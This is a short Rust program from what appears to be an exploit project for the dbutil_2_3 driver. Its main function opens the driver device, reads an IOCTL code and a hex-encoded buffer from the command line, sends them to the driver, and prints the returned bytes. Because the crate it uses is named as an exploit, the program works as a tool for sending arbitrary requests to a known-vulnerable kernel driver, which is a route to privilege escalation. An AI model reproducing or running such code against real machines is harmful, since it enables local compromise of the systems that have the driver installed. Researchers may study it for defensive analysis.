use dbutil_2_3_exploit::{ioctl, open_dev};

fn main() {

    let hdev = unsafe { open_dev() };   // Open the device
    let args: Vec<String> = std::env::args().collect();     // Get the program arguments as a vector of strings 
    let ioctl_code = u32::from_str_radix(&args[1].trim_start_matches("0x"), 16).expect("Bad ioctl number"); // Parse the IOCTL number from the first arg
    
    let mut buffer = hex::decode(&args[2]).expect("Bad hex buffer");    // Decode the hexidecimal input from the second arg
    unsafe {
        ioctl(hdev, ioctl_code, buffer.as_mut_ptr() as _, buffer.len())       // Call the specified IOCTL
    };

    println!("Output: {}", hex::encode(&buffer));
}